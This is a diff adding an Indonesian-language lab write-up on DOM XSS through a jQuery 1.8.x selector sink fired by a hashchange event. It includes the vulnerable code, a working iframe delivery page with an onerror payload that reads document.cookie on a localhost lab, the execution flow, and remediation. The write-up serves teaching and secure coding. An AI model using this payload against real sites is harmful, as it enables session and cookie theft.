@@ -179,3 +179,71 @@ Ketika korban (atau bot verifikasi CTF) mengklik tombol `Back`, browser akan men
    }
    ```
 2. Hindari menerima URI skema arbitrary dari parameter query pengguna.
+
+---
+
+## Lab 06: DOM XSS in jQuery selector sink using a hashchange event
+
+### 🎯 Tujuan Pembelajaran
+1. Memahami kerentanan pada mesin selector jQuery versi lama (khususnya 1.8.x dan sebelumnya), di mana karakter tag HTML yang dimasukkan ke dalam pemanggilan `$()` dapat memicu pembuatan elemen DOM dan mengeksekusi script.
+2. Memahami alur eksploitasi berbasis event (event-driven DOM XSS), di mana payload disuntikkan melalui perubahan URL fragment (`hashchange`).
+3. Memahami interaksi lintas origin (*cross-origin*) dan pembatasan *Same-Origin Policy* (SOP) dengan memanfaatkan elemen `<iframe>` dari halaman pihak ketiga (*Challenge Helper Page*).
+
+### 🔍 Analisis Kerentanan
+- **Vulnerability Type**: DOM-based XSS (Selector Sink & Event Trigger)
+- **Source**: `location.hash` (`window.location.hash.slice(1)`)
+- **Trigger**: Event `hashchange` pada objek `window`.
+- **Sink**: Pemanggilan fungsi jQuery `$()`:
+  ```javascript
+  $(window).on('hashchange', function() {
+    var query = decodeURIComponent(window.location.hash.slice(1));
+    if (query) {
+      var post = $('section.blog-list h2:contains(' + query + ')');
+      if (post && post.length > 0) {
+        post.get(0).scrollIntoView();
+      }
+    }
+  });
+  ```
+- **Penyebab**: Di jQuery 1.8.x, ketika sebuah string yang mengandung sintaks tag HTML dimasukkan ke dalam selector `$()`, parser selector Sizzle gagal memproses selector dan mencoba membuat elemen HTML baru. Jika string tersebut berisi `<img src=x onerror=...>`, browser akan mengeksekusi script saat gambar gagal dimuat.
+
+### 💡 Contoh Eksploitasi Menggunakan Challenge Helper Page
+Karena penyerang perlu memicu event `hashchange` pada browser korban tanpa interaksi pengguna, penyerang memanfaatkan dokumen HTML di server pembantu (*Challenge Helper Page* pada origin terpisah, misalnya `http://localhost:3001/helper/<team_id>`):
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Lab 06 Exploit Delivery</title>
+</head>
+<body>
+  <iframe src="http://localhost:3000/lab06#"
+          onload="this.src += '<img src=x onerror=alert(document.cookie)>'"
+          style="width: 100%; height: 500px;">
+  </iframe>
+</body>
+</html>
+```
+
+**Alur Eksekusi:**
+1. Iframe pertama kali memuat `http://localhost:3000/lab06#` (hash kosong).
+2. Setelah halaman di dalam iframe selesai dimuat, event `onload` pada iframe terpicu.
+3. Event `onload` mengubah `src` iframe menjadi `http://localhost:3000/lab06#<img src=x onerror=alert(document.cookie)>`.
+4. Perubahan hash ini memicu event `hashchange` di dalam window iframe (konteks origin Lab 06).
+5. Skrip Lab 06 mengeksekusi `$('section.blog-list h2:contains(<img src=x onerror=alert(document.cookie)>)')`.
+6. jQuery 1.8.x merender tag `<img>` dan mengeksekusi payload di origin Lab 06, membaca cookie flag `FLAG_LAB06`.
+
+### 🛡️ Remediasi (Secure Coding)
+1. Perbarui jQuery ke versi modern (jQuery 3.x+) yang membedakan pemrosesan selector dan HTML creation secara ketat.
+2. Sanitasi atau encode string sebelum dimasukkan ke dalam selector string, atau gunakan API DOM murni:
+   ```javascript
+   var headers = document.querySelectorAll('section.blog-list h2');
+   for (var i = 0; i < headers.length; i++) {
+     if (headers[i].textContent.includes(query)) {
+       headers[i].scrollIntoView();
+       break;
+     }
+   }
+   ```
+3. Jangan pernah menggabungkan input pengguna mentah ke dalam parameter selector jQuery.
+
